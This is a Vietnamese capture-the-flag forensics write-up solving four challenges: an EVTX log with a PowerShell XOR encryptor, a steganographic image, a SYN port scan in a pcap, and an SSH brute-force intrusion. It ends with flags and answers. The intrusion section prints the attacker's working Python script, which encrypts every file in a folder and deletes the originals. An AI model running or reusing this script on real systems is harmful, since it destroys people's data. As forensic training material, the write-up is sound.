# PS5
>Are you familiar with an EVTX file and what it is used for? I have created a custom EVTX file to demonstrate what it can display.
> Author: K9t

Ở challenge này, ta được cho 1 file log evtx. Giờ ta sẽ mở nó lên để xem bên trong nó có thể khai thác được gì.
![image](https://hackmd.io/_uploads/BkWeALOtJx.png)

Sau một lúc tìm kiếm thì em tìm được 3 cái sau có vẻ khả nghi:
![image](https://hackmd.io/_uploads/HksP0IdYkg.png)

Đây là đoạn code ở **myfirstsecret**
![image](https://hackmd.io/_uploads/rJ7kyv_Fye.png)
Nó thực hiện decode base64 rồi mở bằng url, ta sẽ thử thực hiện xem
![image](https://hackmd.io/_uploads/H1cU1PuYkx.png)
Có vẻ như là ngõ cụt rồi :))

Ta sẽ quay lại khai thác ở **mysecondsecret**

Ta có được đoạn code sau và một mã base64 đã bị mã hóa như sau:

**Encrypted string: LX8qDHZwJzU8KSV6Di10KRMwNxFJOCUGZGViIQ==**

```powershell=
Copy-Item -Path C:\Users\secret.txt -Destination D:\sussy

    function Encrypt {
        param(
            [byte[]]$data,
            [byte[]]$key1,
            [int]$key2
        )

        $temp = New-Object byte[] ($data.Length)
        for($i=0; $i -lt $data.Length; $i++) {
            $temp[$i] = $data[$i] -bxor $key1[$i] -bxor $key2
        }
        return $temp
    }

    $randomBytes = New-Object byte[] 1
    $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::Create()
    $rng.GetBytes($randomBytes)

    $file = "D:\sussy\secret.txt"
    $data = Get-Content -Path $file

    $data = [System.Text.Encoding]::UTF8.GetBytes($data)
    $key1 = [System.Text.Encoding]::UTF8.GetBytes("Myfirstkey")
    $key2 = [int]$randomBytes[0]

    While ($key1.Length -lt $data.Length) {
        $key1 += $key1
    }

    $key1 = $key1[0..($data.Length - 1)]

    $encrypted = Encrypt -data $data -key1 $key1 -key2 $key2
    $encrypted = [Convert]::ToBase64String($encrypted)
    $encrypted
```

Đoạn code trên đã thực hiện lấy nội dung ở file secret.txt rồi mã hóa nó thành encrypted strings base64 trên.

Giờ ta sẽ code decrypt nó lại để lấy lại nội dung bên trong file secret.txt.

Ta có code decrypt như sau:
```python=
import base64

encrypted_strings = "LX8qDHZwJzU8KSV6Di10KRMwNxFJOCUGZGViIQ=="
encrypted = base64.b64decode(encrypted_strings)

key1 = "Myfirstkey"

while len(key1) < len(encrypted):
    key1 += key1

key1 = key1[:len(encrypted)]
key1 = key1.encode()

for key2 in range(256):
    tmp = ""
    for i in range(len(encrypted)):
        tmp += chr(encrypted[i] ^ key1[i] ^ key2)
    if "W1" in tmp:
        print(tmp)
        break
```

**Flag: W1{R34ding_4_s1mPle_3vtX!!!}**

# Cloakkkkkk

>The secret is concealed within plain text using invisible characters and secured with a password. However, all that's visible is the WannaW1n Club logo. Can you uncover the hidden plain text and reveal the secret?
>Author: Pirin

Ở challenge này, ta được cho 1 file ảnh bmp. Giờ ta sẽ đi vào phân tích nó.
![image](https://hackmd.io/_uploads/rJvo4DuKJx.png)
Khi strings nó, ta thấy có dòng trên, có vẻ là pass của steghide. Sử dụng steghide để extract tệp ẩn, ta có được 1 file txt có nội dung như sau:
![image](https://hackmd.io/_uploads/HkexSw_tJl.png)

Sau một lúc mày mò mà không tìm thêm được gì, em đã thử kiểm tra màu của bức ảnh bằng forensically xem thì có được một cái mã QR.
![image](https://hackmd.io/_uploads/B10EHDutyx.png)

Nội dung của mã qr như sau:

![image](https://hackmd.io/_uploads/r1u8HP_Fye.png)

Sau thêm một lúc research dựa trên tiêu đề và mô tả của bài thì em tìm ra được cái này:

![image](https://hackmd.io/_uploads/SyWzLP_tye.png)

Cuối cùng thì ta có được flag như sau:
![image](https://hackmd.io/_uploads/rytXUwOYkl.png)

**Flag: W1{Invisible_T3xt_Hia1d3n_15y_5t390cl04kfd5d2f3d}**

# Not A Free Flag
>When I was learning Wireshark, I captured something interesting, which I believe might be a port scan. Could you help me identify the following details:
>1. The IP address of the scanner
>2. The scan technique used
>3. The number of open ports scanned
>Flag format: W1{IP_scan-technique_number-of-opened-ports}
>Example: W1{192.168.1.100_ack-scan_30}
>Author: K9t

Challenge này cho ta 1 file pcap ghi lại việc thực hiện quét việc quét cổng và yêu cầu ta trả lời 3 câu hỏi.

![image](https://hackmd.io/_uploads/HJnd1R_Y1l.png)

Quan sát một chút, ta sẽ thấy được **172.20.10.9** đang thực hiện gửi các gói **SYN** đến nhiều cổng khác nhau và có vẻ đó là ip của máy quét đang thực hiện quét cổng và kỹ thuật quét của nó là SYN Scan.

Và để biết được một cổng có đang mở hay không thì sau khi gửi đi gói **SYN** và được phản hồi lại bằng gói **SYN-ACK** thì có nghĩa là cổng đó đang được mở.

Bây giờ cổng việc của ta đơn giản sẽ là lọc lại các gói tin có **SYN-ACK** với ip là **172.20.10.9**

![image](https://hackmd.io/_uploads/rJDybAut1l.png)

Nếu như cứ vào đếm thì rất dễ đếm sai, ta quan sát một chút sẽ thấy có vẻ cổng 3306 được quét khá nhiều lần, ta sẽ lọc những cổng mà không phải 3306 xem có dễ đếm hơn không.

![image](https://hackmd.io/_uploads/r1H-bCdFyg.png)

Vậy là có tất cả 5 cổng được mở bao gồm 3306, 135, 80, 2179, 5454.

**Flag: W1{172.20.10.9_syn-scan_5}**

# SimpleQnA
> Due to the administrator's carelessness, the company's server was attacked using a brute force SSH attack technique. Utilize your forensic knowledge to uncover the truth and find the flag.
> Author: Pirin

#### [1]. What is IP address of attacker ? (Format: ``***.***.***.*``)
Người ta hỏi địa chỉ IP của kẻ tấn công là gì, ta vào __/var/log/auth.log__ để dò tìm.
![image](https://hackmd.io/_uploads/H1Keu1YK1g.png)
Ta thấy địa chỉ 192.168.233.1 liên tục truy cập và đây chính là địa chỉ của kẻ tấn công.
**Answer: 192.168.233.1**
#### [2]. Identify the timestamp when the attacker manually logged in to the server to carry out their objectives. (Format: YYYY/MM/DD hh:mm:ss)
Người ta hỏi là kẻ tấn công đã đăng nhập thành công vào lúc nào. Ta vẫn tiếp tục tìm kiếm trong file auth.log.
![image](https://hackmd.io/_uploads/H1lMukYtJg.png)
Ta thấy vào lúc 2024/09/20 17:54:26, kẻ tấn công đã đăng nhập thành công.
**Answer: 2024/09/20 17:54:26**
#### [3]. What the username the attacker gain access to the server? (Format: ``****``)
Ở ảnh trong câu trả lời thứ 2 đã có câu trả lời. Hệ thống đã thông báo root đã nhập thành công pass vào lúc 17:54:26 20/09/2024.
**Answer: root**
#### [4]. Full path of ransomware file (Example: /home/ransomfile.exe)
Câu hỏi là đường dẫn của file mã độc nằm ở đâu. 
![image](https://hackmd.io/_uploads/BJNdukKK1x.png)
Ta thấy các file bị encrypt một cách nào đó thành base64.
Ta vào **/root**, bên trong nó có các file và thư mục như sau:
![image](https://hackmd.io/_uploads/SJ75u1FFyx.png)
Ta check **.bash_history**
![image](https://hackmd.io/_uploads/H1Bi_1KYkg.png)
Thấy root tải file **.exfil.py** về rồi thực thi, có lẽ ngay sau đó các tệp đã bị encrypt.
Kiểm tra file **.exfil.py**
![image](https://hackmd.io/_uploads/SkPTdyYYJx.png)
Và đây chính là file mã độc đã mã hóa các file thành .enc.
**Answer: /root/.exfil.py**
#### [5]. What is the MITRE ATT&CK sub-technique ID used for persistence? (Example: T1010.001)

Câu hỏi là ID **MITRE ATT&CK sub-technique** để duy trì quyền truy cập hệ thống là gì. 
Tiếp tục dò file **auth.log**. Ta thấy kẻ tấn công liên tục tạo các Local Account.
![image](https://hackmd.io/_uploads/HkjlY1Ytkx.png)
Lên trang web https://attack.mitre.org/tactics/TA0003/ để tìm ID với cách duy trì truy cập hệ thống như trên.
Và ta có được ID như sau.
![image](https://hackmd.io/_uploads/ryOWYyFFJx.png)
**Answer: T1136.001**
#### [6]. What usernames did the attacker create to create the backdoor (Format: user1,user2)?
Câu hỏi là tên tài khoản mà kẻ tấn công tạo tên là gì. Trong bức ảnh auth.log ở câu 5 đã có đáp án, kẻ tấn công đã tạo ra 2 local account là koshitan và koshian, koshitan tạo vào lúc 18:04:37 còn koshian tạo vào lúc 18:09:01.
Nhìn vào file log rất có thể nhìn nhầm koshian thành koshitan nên em đã mất khá nhiều thời gian để nhận ra điều này.
**Answer: koshitan,koshian**
#### [7]. What are the contents of the secret file that attacker exfiltrated?
Câu hỏi là file secret đã bị encrypt có nội dung là gì. 
Ta có source encrypt của file mã độc như sau:
```python=
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import os
import base64
import argparse


def aes_encrypt(file_path, key):
    key = base64.b64decode(key)
    iv = get_random_bytes(16)
    plaintext = open(file_path, "rb").read()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_plaintext = pad(plaintext, AES.block_size)
    ciphertext = cipher.encrypt(padded_plaintext)
    encrypt_file_path = file_path + ".enc"
    with open(encrypt_file_path, "wb") as f:
        f.write(base64.b64encode(iv + ciphertext))
    os.remove(file_path)


def main(folder_path,key):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            aes_encrypt(file_path, key)


parser = argparse.ArgumentParser(description="Process to exfiltrate data")
parser.add_argument('-k', "--key", type=str, required=True, help="A base64 key to process")
parser.add_argument('-F', "--folder_path", type=str, required=True, help="A folder to exfiltrate")
args = parser.parse_args()
main(args.folder_path, args.key)
```

Cụ thể, nó đã mã hóa các tệp tin bằng cách sử dụng thuật toán AES trong chế độ CBC. Key mã hóa được cung cấp dưới dạng base64, và tệp tin được mã hóa sẽ được lưu với phần mở rộng .enc. Tệp tin gốc sau đó sẽ bị xóa.
Ta vào lại /root/bash_history/ để xem lịch sử của root đã làm gì.
![image](https://hackmd.io/_uploads/rJgKYyKFJl.png)
Ta thấy được rằng kẻ tấn công đã thực hiện encrypt vào thư mục nokotan sau đó xóa đi secret.txt.enc. Có vẻ như sau đó kẻ tấn công đã xem nội dung bị encrypt của secret sau đó gửi tới nfjijju2.requestrepo.com. Như hình trên, ta đã có được key mã hóa cùng với nội dung đã bị encrypt của file secret. Giờ ta có code decrypt như sau:
```python=
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64


def aes_decrypt_and_print(f, key):
    # Giải mã khóa từ base64
    key = base64.b64decode(key)
    # Giải mã chuỗi đầu vào từ base64
    data = base64.b64decode(f)
    # Lấy IV từ dữ liệu giải mã (16 byte đầu tiên)
    iv = data[:16]
    # Lấy ciphertext từ dữ liệu giải mã (phần còn lại)
    ciphertext = data[16:]
    # Tạo đối tượng cipher với AES CBC mode và IV
    cipher = AES.new(key, AES.MODE_CBC, iv)
    try:
        # Giải mã ciphertext và loại bỏ padding
        decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
        # In ra nội dung đã giải mã
        print(decrypted_data.decode('utf-8'))
    except ValueError as e:
        print("Error during decryption:", e)
# Dữ liệu đã mã hóa (f) và khóa (key)
f = "rytcy2C/IaMXY6CY3jZCMLgG9BIiNaaYJIUwv1d7V4Yz2lfjZPb/a6pCeUKoe8WJ"
key = "bm9rb3Rhbmtvbm9uYWkxMg=="
# Giải mã và in ra nội dung
aes_decrypt_and_print(f, key)
```
**Answer: W1{!!C0ngr4tUUUl4tI0ns1!}**

Trả lời xong 7 câu hỏi, ta đã có được flag.
**Flag: W1{!!N0kot4n_sHIkaNN00kO_Hackeddd!!3086230133}**
